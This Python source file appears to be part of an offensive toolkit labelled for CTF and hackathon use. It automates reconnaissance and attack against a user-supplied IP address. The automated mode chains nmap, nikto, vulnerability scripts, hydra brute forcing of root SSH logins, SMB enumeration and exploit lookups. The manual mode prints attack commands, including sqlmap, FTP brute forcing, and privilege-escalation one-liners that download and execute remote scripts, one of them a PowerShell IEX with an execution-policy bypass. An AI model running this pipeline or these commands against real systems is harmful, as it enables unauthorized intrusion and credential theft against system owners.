#!/usr/bin/env python3
"""
CLAN NXT Toolkit - Hackathon Mode
Automated and manual system exploitation for CTF/hackathon scenarios.
"""

import os
import time
import socket
from datetime import datetime

from modules.banner import (
    C, clear_screen, print_header, print_menu_option, print_status,
    get_input, print_table, print_separator, print_result_box,
    loading_animation, print_progress_bar, confirm_action, typing_effect
)
from modules.utils import (
    run_command, check_tool_installed, auto_install_tool, get_local_ip,
    get_subnet, is_valid_ip, check_port, save_report, log_action
)


def is_windows():
    """Check if running on Windows."""
    return os.name == "nt"


# ═══════════════════════════════════════════════════════════
# AUTOMATED HACKATHON MODE
# ═══════════════════════════════════════════════════════════
def auto_hackathon():
    """Fully automated reconnaissance and exploitation pipeline."""
    clear_screen()
    print_header("AUTOMATED HACKATHON MODE", "Full recon → exploit pipeline")

    # ── Platform check ──
    if is_windows():
        print_status(f"{C.Y}Windows detected. Hackathon Automated Mode requires Linux/Kali.{C.RST}", "warning")
        print_status("Tools like nmap, nikto, hydra are Linux packages (apt install).", "info")
        print_status(f"Run this tool on {C.W}Kali Linux{C.RST} for full functionality.", "info")
        print_status("Switching you to Manual Mode (works on any platform)...", "info")
        print()
        manual_hackathon()
        return

    # Step 0: Pre-checks (Linux only)
    print_status("Running pre-flight checks...", "scan")
    local_ip = get_local_ip()
    subnet = get_subnet()
    print_status(f"Your IP: {C.W}{local_ip}{C.RST}", "info")
    print_status(f"Subnet: {C.W}{subnet}{C.RST}", "info")

    required = {"nmap": False, "nikto": False, "searchsploit": False, "hydra": False}
    for tool in required:
        print_status(f"Checking {tool}...", "scan")
        required[tool] = auto_install_tool(tool)
        s = "success" if required[tool] else "error"
        ic = "✓" if required[tool] else "✗"
        print_status(f"{tool}: {ic}", s)

    if not required["nmap"]:
        print_status("nmap is required and could not be installed. Run: sudo apt install nmap", "error")
        return

    # Step 1: Network connectivity check
    print_header("STEP 1: NETWORK CONNECTIVITY")
    choice = input(f"  {C.CY}Are you on the same network as the target? (y/n):{C.RST} ").strip().lower()

    if choice == "y":
        print_status("Scanning local network for hosts...", "working")
        loading_animation("ARP Scan")
        rc, out, err = run_command(f"nmap -sn {subnet}", timeout=60)
        if rc == 0:
            print(f"\n{C.GR}{out}{C.RST}")
            hosts = []
            for line in out.split("\n"):
                if "Nmap scan report for" in line:
                    ip = line.split()[-1].strip("()")
                    if ip != local_ip:
                        hosts.append(ip)
            if hosts:
                print_status(f"Found {len(hosts)} live host(s):", "found")
                for i, h in enumerate(hosts, 1):
                    print(f"    {C.CY}[{i}]{C.RST} {C.W}{h}{C.RST}")
                sel = input(f"\n  {C.CY}Select target # (or enter IP):{C.RST} ").strip()
                try:
                    target_ip = hosts[int(sel) - 1]
                except:
                    target_ip = sel
            else:
                print_status("No other hosts found.", "warning")
                target_ip = input(f"  {C.CY}Enter target IP manually:{C.RST} ").strip()
        else:
            print_status(f"Scan failed: {err}", "error")
            target_ip = input(f"  {C.CY}Enter target IP:{C.RST} ").strip()
    else:
        target_ip = input(f"  {C.CY}Enter target IP:{C.RST} ").strip()

    if not target_ip or not is_valid_ip(target_ip):
        print_status("Invalid IP address.", "error")
        return

    print_status(f"Target set: {C.W}{target_ip}{C.RST}", "success")
    report_lines = [f"CLAN NXT - HACKATHON REPORT\nTarget: {target_ip}\nDate: {datetime.now()}\n{'='*60}\n"]

    # Step 2: Port Scanning
    print_header("STEP 2: PORT SCANNING & SERVICE DETECTION")
    print_status("Running aggressive Nmap scan...", "working")
    loading_animation("Port Scanning (this may take a few minutes)")

    rc, out, err = run_command(f"nmap -sV -sC -A -T4 -p- {target_ip}", timeout=600)
    if rc == 0:
        print(f"\n{C.GR}{out}{C.RST}")
        report_lines.append(f"\n[PORT SCAN]\n{out}\n")

        # Parse open ports
        open_ports = []
        services = {}
        for line in out.split("\n"):
            if "/tcp" in line and "open" in line:
                parts = line.split()
                port = parts[0].split("/")[0]
                service = parts[2] if len(parts) > 2 else "unknown"
                version = " ".join(parts[3:]) if len(parts) > 3 else ""
                open_ports.append(int(port))
                services[int(port)] = {"service": service, "version": version}
                print_status(f"Port {C.W}{port}{C.RST} → {C.CY}{service}{C.RST} {C.GR}{version}{C.RST}", "found")

        if not open_ports:
            print_status("No open ports found.", "warning")
            report_lines.append("\nNo open ports detected.\n")
    else:
        print_status(f"Nmap failed: {err}", "error")
        # Fallback: quick scan
        print_status("Trying quick scan...", "working")
        rc, out, err = run_command(f"nmap -sV -T4 {target_ip}", timeout=120)
        open_ports = []
        services = {}
        if rc == 0:
            print(f"\n{C.GR}{out}{C.RST}")
            for line in out.split("\n"):
                if "/tcp" in line and "open" in line:
                    parts = line.split()
                    port = int(parts[0].split("/")[0])
                    open_ports.append(port)
                    services[port] = {"service": parts[2] if len(parts)>2 else "unknown", "version": ""}

    # Step 3: Vulnerability Scanning
    print_header("STEP 3: VULNERABILITY DETECTION")

    if required.get("nikto") and any(p in open_ports for p in [80, 443, 8080, 8443]):
        web_port = next(p for p in [80, 443, 8080, 8443] if p in open_ports)
        proto = "https" if web_port in (443, 8443) else "http"
        print_status(f"Running Nikto on port {web_port}...", "working")
        rc, out, err = run_command(f"nikto -h {proto}://{target_ip}:{web_port} -maxtime 120s", timeout=180)
        if rc == 0:
            print(f"\n{C.GR}{out}{C.RST}")
            report_lines.append(f"\n[NIKTO SCAN - Port {web_port}]\n{out}\n")

    # Nmap vuln scripts
    print_status("Running Nmap vulnerability scripts...", "working")
    rc, out, err = run_command(f"nmap --script vuln -p {','.join(str(p) for p in open_ports[:20])} {target_ip}", timeout=300)
    if rc == 0:
        print(f"\n{C.GR}{out}{C.RST}")
        report_lines.append(f"\n[NMAP VULN SCRIPTS]\n{out}\n")

    # Step 4: Service-specific attacks
    print_header("STEP 4: SERVICE-SPECIFIC ANALYSIS")

    for port, info in services.items():
        svc = info["service"].lower()

        if svc in ("ssh",) and port in (22,):
            print_status(f"SSH on port {port} - checking for weak creds...", "attack")
            if required.get("hydra"):
                rc, out, _ = run_command(
                    f"hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f {target_ip} ssh -V 2>&1 | head -30",
                    timeout=60)
                if "successfully" in out.lower():
                    print_status(f"SSH CREDENTIALS FOUND!", "found")
                report_lines.append(f"\n[SSH BRUTE - Port {port}]\n{out[:500]}\n")

        elif svc in ("http", "https") or port in (80, 443, 8080, 8443):
            print_status(f"Web service on port {port} - fingerprinting...", "scan")
            if auto_install_tool("whatweb"):
                proto = "https" if port in (443, 8443) else "http"
                rc, out, _ = run_command(f"whatweb {proto}://{target_ip}:{port}", timeout=30)
                if rc == 0:
                    print(f"    {C.GR}{out.strip()}{C.RST}")
                    report_lines.append(f"\n[WHATWEB - Port {port}]\n{out}\n")

        elif svc in ("smb", "microsoft-ds", "netbios-ssn") or port in (139, 445):
            print_status(f"SMB on port {port} - enumerating...", "scan")
            if auto_install_tool("enum4linux"):
                rc, out, _ = run_command(f"enum4linux -a {target_ip} 2>&1 | head -80", timeout=60)
                if rc == 0:
                    print(f"\n{C.GR}{out}{C.RST}")
                    report_lines.append(f"\n[SMB ENUM]\n{out[:1000]}\n")

        elif svc in ("ftp",) and port == 21:
            print_status(f"FTP on port {port} - checking anonymous access...", "scan")
            rc, out, _ = run_command(f"nmap --script ftp-anon -p 21 {target_ip}", timeout=30)
            if "Anonymous" in out:
                print_status("Anonymous FTP access ALLOWED!", "found")
            report_lines.append(f"\n[FTP CHECK]\n{out}\n")

    # Step 5: Exploit suggestions
    print_header("STEP 5: EXPLOIT SUGGESTIONS")

    if required.get("searchsploit"):
        for port, info in services.items():
            ver = info["version"]
            if ver:
                print_status(f"Searching exploits for: {ver}", "scan")
                rc, out, _ = run_command(f"searchsploit {ver} 2>&1 | head -20", timeout=30)
                if rc == 0 and "Exploits" in out:
                    print(f"\n{C.GR}{out}{C.RST}")
                    report_lines.append(f"\n[SEARCHSPLOIT - {ver}]\n{out}\n")

    # Generate report
    report_text = "\n".join(report_lines)
    filepath = save_report(f"hackathon_{target_ip.replace('.','_')}", report_text)
    print_result_box("SCAN COMPLETE", f"Target: {target_ip}\nOpen Ports: {len(open_ports)}\nReport: {filepath}", C.G)
    log_action("HACKATHON_AUTO", target_ip)


# ═══════════════════════════════════════════════════════════
# MANUAL HACKATHON MODE
# ═══════════════════════════════════════════════════════════
def manual_hackathon():
    """Interactive manual hacking assistance with guided suggestions."""
    clear_screen()
    print_header("MANUAL HACKATHON MODE", "Guided attack methodology")

    typing_effect("  Answer the following questions about the target system...", delay=0.015)
    print()

    # Gather intel
    target_ip = input(f"  {C.CY}Target IP/Hostname:{C.RST} ").strip()
    os_type = input(f"  {C.CY}Target OS (linux/windows/unknown):{C.RST} ").strip().lower() or "unknown"
    same_net = input(f"  {C.CY}Same network? (y/n):{C.RST} ").strip().lower() == "y"
    web_app = input(f"  {C.CY}Web application present? (y/n):{C.RST} ").strip().lower() == "y"
    known_services = input(f"  {C.CY}Known services (comma-separated, e.g., ssh,http,ftp):{C.RST} ").strip()
    services = [s.strip() for s in known_services.split(",")] if known_services else []

    print_header("SUGGESTED ATTACK METHODOLOGY")

    step = 1

    # Recon
    print(f"\n  {C.R}━━━ PHASE 1: RECONNAISSANCE ━━━{C.RST}")
    suggestions = [
        (f"nmap -sV -sC -A -T4 -p- {target_ip}", "Full port scan with version detection"),
        (f"nmap -sU --top-ports 100 {target_ip}", "UDP port scan (top 100)"),
    ]
    if same_net:
        suggestions.append((f"nmap -sn {get_subnet()}", "Network host discovery"))
        suggestions.append((f"arp-scan -l", "ARP scan local network"))
    if web_app:
        suggestions.append((f"whatweb http://{target_ip}", "Web technology fingerprinting"))
        suggestions.append((f"nikto -h http://{target_ip}", "Web vulnerability scan"))
        suggestions.append((f"gobuster dir -u http://{target_ip} -w /usr/share/wordlists/dirb/common.txt", "Directory bruteforce"))
        suggestions.append((f"wpscan --url http://{target_ip}", "WordPress scan (if applicable)"))

    for cmd, desc in suggestions:
        print(f"    {C.R}[{step}]{C.RST} {C.W}{desc}{C.RST}")
        print(f"        {C.CY}$ {cmd}{C.RST}")
        step += 1

    # Service-specific
    print(f"\n  {C.R}━━━ PHASE 2: SERVICE EXPLOITATION ━━━{C.RST}")

    if "ssh" in services or os_type == "linux":
        print(f"\n    {C.Y}▸ SSH Attacks:{C.RST}")
        cmds = [
            (f"hydra -l root -P /usr/share/wordlists/rockyou.txt {target_ip} ssh", "Brute force SSH"),
            (f"ssh-audit {target_ip}", "SSH configuration audit"),
        ]
        for cmd, desc in cmds:
            print(f"    {C.R}[{step}]{C.RST} {C.W}{desc}{C.RST}")
            print(f"        {C.CY}$ {cmd}{C.RST}")
            step += 1

    if "http" in services or web_app:
        print(f"\n    {C.Y}▸ Web Attacks:{C.RST}")
        cmds = [
            (f"sqlmap -u 'http://{target_ip}/?id=1' --dbs", "SQL Injection test"),
            (f"dirb http://{target_ip} /usr/share/wordlists/dirb/big.txt", "Directory brute force"),
            (f"wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt http://{target_ip}/FUZZ", "Fuzzing"),
        ]
        for cmd, desc in cmds:
            print(f"    {C.R}[{step}]{C.RST} {C.W}{desc}{C.RST}")
            print(f"        {C.CY}$ {cmd}{C.RST}")
            step += 1

    if "smb" in services or os_type == "windows":
        print(f"\n    {C.Y}▸ SMB/Windows Attacks:{C.RST}")
        cmds = [
            (f"enum4linux -a {target_ip}", "Full SMB enumeration"),
            (f"smbclient -L //{target_ip} -N", "List SMB shares"),
            (f"crackmapexec smb {target_ip} --shares", "Enumerate shares"),
            (f"nmap --script smb-vuln* -p 445 {target_ip}", "SMB vulnerability scan"),
        ]
        for cmd, desc in cmds:
            print(f"    {C.R}[{step}]{C.RST} {C.W}{desc}{C.RST}")
            print(f"        {C.CY}$ {cmd}{C.RST}")
            step += 1

    if "ftp" in services:
        print(f"\n    {C.Y}▸ FTP Attacks:{C.RST}")
        cmds = [
            (f"nmap --script ftp-anon -p 21 {target_ip}", "Check anonymous FTP"),
            (f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target_ip} ftp", "Brute force FTP"),
        ]
        for cmd, desc in cmds:
            print(f"    {C.R}[{step}]{C.RST} {C.W}{desc}{C.RST}")
            print(f"        {C.CY}$ {cmd}{C.RST}")
            step += 1

    # Privilege Escalation
    print(f"\n  {C.R}━━━ PHASE 3: PRIVILEGE ESCALATION ━━━{C.RST}")
    if os_type in ("linux", "unknown"):
        print(f"\n    {C.Y}▸ Linux PrivEsc:{C.RST}")
        privesc = [
            ("sudo -l", "Check sudo permissions"),
            ("find / -perm -4000 2>/dev/null", "Find SUID binaries"),
            ("cat /etc/crontab", "Check cron jobs"),
            ("wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh", "Run LinPEAS"),
        ]
        for cmd, desc in privesc:
            print(f"    {C.R}[{step}]{C.RST} {C.W}{desc}{C.RST}")
            print(f"        {C.CY}$ {cmd}{C.RST}")
            step += 1

    if os_type in ("windows", "unknown"):
        print(f"\n    {C.Y}▸ Windows PrivEsc:{C.RST}")
        privesc = [
            ("whoami /priv", "Check current privileges"),
            ("systeminfo | findstr /B /C:\"OS\"", "System information"),
            ("powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\"", "Run WinPEAS"),
        ]
        for cmd, desc in privesc:
            print(f"    {C.R}[{step}]{C.RST} {C.W}{desc}{C.RST}")
            print(f"        {C.CY}$ {cmd}{C.RST}")
            step += 1

    # Quick run
    print(f"\n{C.GR}{'─'*60}{C.RST}")
    run_choice = input(f"\n  {C.CY}Run a command? Enter step # or 'q' to quit:{C.RST} ").strip()
    while run_choice and run_choice != "q":
        print_status("Running command...", "working")
        # This is a guidance tool - user should run commands manually
        print_status("Copy and run the command in your terminal for best results.", "info")
        run_choice = input(f"\n  {C.CY}Another step # or 'q':{C.RST} ").strip()

    log_action("HACKATHON_MANUAL", target_ip)


# ═══════════════════════════════════════════════════════════
# HACKATHON MENU
# ═══════════════════════════════════════════════════════════
def hackathon_mode():
    """Main hackathon mode interface."""
    while True:
        clear_screen()
        print(f"\n{C.R}  ╔══════════════════════════════════════════════════╗{C.RST}")
        print(f"{C.R}  ║{C.RST}  {C.W}{C.BOLD}🏴 HACKATHON MODE{C.RST}                               {C.R}║{C.RST}")
        print(f"{C.R}  ║{C.RST}  {C.GR}CTF & Hackathon exploitation toolkit{C.RST}             {C.R}║{C.RST}")
        print(f"{C.R}  ╚══════════════════════════════════════════════════╝{C.RST}\n")

        print_menu_option("1", "Automated Mode", "Full auto recon → scan → exploit pipeline")
        print_menu_option("2", "Manual Mode", "Guided attack suggestions based on target")
        print_menu_option("0", "Back to Main Menu")

        choice = get_input("hackathon")

        if choice == "1":
            if not confirm_action("Start automated scan? Ensure you have authorization."):
                continue
            auto_hackathon()
            get_input("enter")
        elif choice == "2":
            manual_hackathon()
            get_input("enter")
        elif choice in ("0", "back", "exit", "quit"):
            break
